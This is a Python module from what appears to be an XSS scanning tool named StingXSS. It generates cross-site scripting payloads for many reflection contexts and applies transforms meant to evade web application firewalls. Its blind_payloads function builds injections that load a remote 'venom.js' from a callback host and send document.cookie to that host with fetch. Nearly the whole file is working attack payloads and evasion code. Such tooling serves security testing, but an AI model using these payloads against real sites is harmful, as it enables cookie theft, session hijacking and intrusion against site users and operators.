# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
StingXSS — engine/payload_gen.py
Context-aware XSS payload generator with WAF evasion transforms.

Logic:
  1. Select a base payload set for the detected ReflectionContext.
  2. Apply WAF evasion transforms appropriate to the detected WAF strategy.
  3. Append any user-supplied custom payloads.
  4. Return a deduplicated list ready for injection.
"""

from __future__ import annotations

import random
import re
import string
import urllib.parse
from typing import List, Optional

from .reporter import ReflectionContext
from .waf_detect import (
  EVASION_BACKTICK,
  EVASION_CASE_MIXING,
  EVASION_CHUNKED_TAGS,
  EVASION_COMMENT_BREAK,
  EVASION_DOUBLE_ENCODE,
  EVASION_HTML_ENCODE,
  EVASION_NEWLINE,
  EVASION_NONE,
  EVASION_NULL_BYTE,
  EVASION_UNICODE,
)

# ---------------------------------------------------------------------------
# Confirmation marker — unique string embedded in every payload.
# The scanner checks for this in the response to confirm execution.
# ---------------------------------------------------------------------------
CONFIRM_MARKER_PREFIX = "vXSS_EXEC_"


def make_confirm_marker() -> str:
  suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
  return f"{CONFIRM_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# Base payloads per context
# Each entry is a format string that accepts a `marker` kwarg.
# ---------------------------------------------------------------------------

_HTML_BODY_PAYLOADS = [
  "<img src=x onerror=alert('{marker}')>",
  "<svg onload=alert('{marker}')>",
  "<details open ontoggle=alert('{marker}')>",
  "<iframe srcdoc=\"<script>alert('{marker}')</script>\">",
  "<body onload=alert('{marker}')>",
  "<input autofocus onfocus=alert('{marker}')>",
  "<video src=x onerror=alert('{marker}')>",
  "<math><mtext></math><img src=x onerror=alert('{marker}')>",
  "<table background=\"javascript:alert('{marker}')\">",
  "</p><script>alert('{marker}')</script>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
]

_ATTR_DOUBLE_PAYLOADS = [
  '"><img src=x onerror=alert(\'{marker}\')>',
  '"><svg onload=alert(\'{marker}\')>',
  '" onmouseover="alert(\'{marker}\')" x="',
  '" onfocus="alert(\'{marker}\')" autofocus="',
  '"><details open ontoggle=alert(\'{marker}\')>',
  '"><script>alert(\'{marker}\')</script>',
]

_ATTR_SINGLE_PAYLOADS = [
  "'><img src=x onerror=alert('{marker}')>",
  "' onmouseover='alert(\"{marker}\")' x='",
  "'><svg onload=alert('{marker}')>",
  "' onfocus='alert(\"{marker}\")' autofocus='",
]

_ATTR_UNQUOTED_PAYLOADS = [
  " onmouseover=alert('{marker}') x=",
  " onfocus=alert('{marker}') autofocus ",
  "/><img src=x onerror=alert('{marker}')>",
  " style=expression(alert('{marker}')) ",
]

_SCRIPT_STRING_D_PAYLOADS = [
  '"-alert(\'{marker}\')-"',
  '";alert(\'{marker}\');//',
  '";\nalert(\'{marker}\');\n//',
  '\\"-alert(\'{marker}\')-\\"',
  '"+alert(\'{marker}\')+\\"',
]

_SCRIPT_STRING_S_PAYLOADS = [
  "'-alert('{marker}')-'",
  "';alert('{marker}');//",
  "';\nalert('{marker}');\n//",
  "\\'-alert('{marker}')-\\'",
]

_SCRIPT_BARE_PAYLOADS = [
  ";alert('{marker}')//",
  "\nalert('{marker}')\n",
  "/**/;alert('{marker}')//",
  "};alert('{marker}');//",
  "]};alert('{marker}');//",
]

_SCRIPT_TEMPLATE_PAYLOADS = [
  "`-alert('{marker}')-`",
  "`;alert('{marker}')//`",
  "${{alert('{marker}')}}",
  "`${{alert('{marker}')}}",
  "`;alert('{marker}')//",
]

_EVENT_HANDLER_PAYLOADS = [
  "alert('{marker}')",
  "confirm('{marker}')",
  "(function(){{alert('{marker}')}})();",
  "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",  # alert(1) as charcode
  "[1].find(alert)",
]

_URL_ATTR_PAYLOADS = [
  "javascript:alert('{marker}')",
  "JaVaScRiPt:alert('{marker}')",
  "javascript&#58;alert('{marker}')",
  "javascript:void(alert('{marker}'))",
  "data:text/html,<script>alert('{marker}')</script>",
]

_CSS_PAYLOADS = [
  "expression(alert('{marker}'))",
  "</style><script>alert('{marker}')</script>",
  "</style><img src=x onerror=alert('{marker}')>",
]

_COMMENT_PAYLOADS = [
  "-->;<script>alert('{marker}')</script><!--",
  "--><img src=x onerror=alert('{marker}')><!--",
  "--><svg onload=alert('{marker}')><!--",
]

_CONTEXT_MAP = {
  ReflectionContext.HTML_BODY:       _HTML_BODY_PAYLOADS,
  ReflectionContext.ATTR_DOUBLE:     _ATTR_DOUBLE_PAYLOADS,
  ReflectionContext.ATTR_SINGLE:     _ATTR_SINGLE_PAYLOADS,
  ReflectionContext.ATTR_UNQUOTED:   _ATTR_UNQUOTED_PAYLOADS,
  ReflectionContext.SCRIPT_STRING_D: _SCRIPT_STRING_D_PAYLOADS,
  ReflectionContext.SCRIPT_STRING_S: _SCRIPT_STRING_S_PAYLOADS,
  ReflectionContext.SCRIPT_BARE:     _SCRIPT_BARE_PAYLOADS,
  ReflectionContext.SCRIPT_TEMPLATE: _SCRIPT_TEMPLATE_PAYLOADS,
  ReflectionContext.EVENT_HANDLER:   _EVENT_HANDLER_PAYLOADS,
  ReflectionContext.URL_ATTR:        _URL_ATTR_PAYLOADS,
  ReflectionContext.CSS:             _CSS_PAYLOADS,
  ReflectionContext.COMMENT:         _COMMENT_PAYLOADS,
  ReflectionContext.UNKNOWN:         _HTML_BODY_PAYLOADS + _ATTR_DOUBLE_PAYLOADS,
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate(
  context:        ReflectionContext,
  evasion:        str = EVASION_NONE,
  marker:         Optional[str] = None,
  custom_payloads: Optional[List[str]] = None,
  level:          int = 1,
) -> List[str]:
  """
  Return a list of payloads tuned for `context` with `evasion` applied.

  level 1 = first 3 payloads per context (fast)
  level 2 = first 6
  level 3 = all
  """
  if marker is None:
    marker = make_confirm_marker()

  base = _CONTEXT_MAP.get(context, _HTML_BODY_PAYLOADS)

  # Slice by level
  limits = {1: 3, 2: 6, 3: len(base)}
  base = base[: limits.get(level, 3)]

  # Materialise markers
  payloads = [p.format(marker=marker) for p in base]

  # Apply evasion transforms
  if evasion != EVASION_NONE:
    transformed = []
    for p in payloads:
      variants = _apply_evasion(p, evasion)
      transformed.extend(variants)
    payloads = transformed

  # Append custom payloads
  if custom_payloads:
    payloads.extend(custom_payloads)

  # Deduplicate preserving order
  seen = set()
  result = []
  for p in payloads:
    if p not in seen:
      seen.add(p)
      result.append(p)

  return result


def blind_payloads(callback_url: str) -> List[str]:
  """Return blind XSS payloads that phone home to `callback_url`."""
  cb = callback_url.rstrip("/")
  return [
    f'"><script src="{cb}/venom.js"></script>',
    f"'><script src='{cb}/venom.js'></script>",
    f"<img src=x onerror=\"var s=document.createElement('script');s.src='{cb}/venom.js';document.head.appendChild(s)\">",
    f"javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39))+'{cb}/venom.js'+String.fromCharCode(39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41))",
    f"</script><script>fetch('{cb}/?c='+document.cookie)</script>",
    f'<svg><animate onbegin=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
  ]


# ---------------------------------------------------------------------------
# Evasion transforms
# ---------------------------------------------------------------------------

def _apply_evasion(payload: str, evasion: str) -> List[str]:
  """Return [original, transformed] — always include the original."""
  variants = [payload]
  try:
    if evasion == EVASION_CASE_MIXING:
      variants.append(_case_mix(payload))
    elif evasion == EVASION_HTML_ENCODE:
      variants.append(_html_encode_lt_gt(payload))
    elif evasion == EVASION_UNICODE:
      variants.append(_unicode_escape_alpha(payload))
    elif evasion == EVASION_DOUBLE_ENCODE:
      variants.append(_double_url_encode(payload))
    elif evasion == EVASION_CHUNKED_TAGS:
      variants.append(_chunked_tag(payload))
    elif evasion == EVASION_NULL_BYTE:
      variants.append(_null_byte_inject(payload))
    elif evasion == EVASION_NEWLINE:
      variants.append(_newline_inject(payload))
    elif evasion == EVASION_COMMENT_BREAK:
      variants.append(_comment_break(payload))
    elif evasion == EVASION_BACKTICK:
      variants.append(_backtick_attr(payload))
  except Exception:
    pass
  return variants


def _case_mix(s: str) -> str:
  """Alternate upper/lower on alpha chars."""
  result = []
  toggle = True
  for c in s:
    if c.isalpha():
      result.append(c.upper() if toggle else c.lower())
      toggle = not toggle
    else:
      result.append(c)
  return "".join(result)


def _html_encode_lt_gt(s: str) -> str:
  return s.replace("<", "&#60;").replace(">", "&#62;")


def _unicode_escape_alpha(s: str) -> str:
  """Unicode-escape the alphabetic chars in tag names and event names."""
  def esc(m: re.Match) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in m.group())
  # Only escape inside JS strings / identifiers — crude but effective
  return re.sub(r"[a-zA-Z]{2,}", esc, s)


def _double_url_encode(s: str) -> str:
  """URL-encode special chars twice."""
  once = urllib.parse.quote(s, safe="")
  return urllib.parse.quote(once, safe="")


def _chunked_tag(s: str) -> str:
  """Split tag names with an SVG/HTML5 trick: <scr ipt> → won't parse but
  some WAFs miss it. Also inserts /* */ inside event names."""
  # Break script tag
  s = re.sub(r"<(script)", r"<\1 ", s, flags=re.IGNORECASE)
  # Break event handler names with /**/ comment
  s = re.sub(r"\b(on\w+)\b", lambda m: m.group()[:3] + "/**/" + m.group()[3:], s)
  return s


def _null_byte_inject(s: str) -> str:
  """Insert a null byte after the first < to confuse WAF parsers."""
  return s.replace("<", "<\x00", 1)


def _newline_inject(s: str) -> str:
  """Replace spaces in tag/attribute names with %0a."""
  return s.replace(" ", "%0a")


def _comment_break(s: str) -> str:
  """Insert <!--/--> inside tag keywords."""
  return re.sub(r"<(/?)(script|img|svg|iframe|body|details|video|input)",
                r"<\1\2<!---->", s, flags=re.IGNORECASE)


def _backtick_attr(s: str) -> str:
  """Replace attribute quote chars with backticks (IE legacy trick)."""
  return s.replace('"', "`").replace("'", "`")
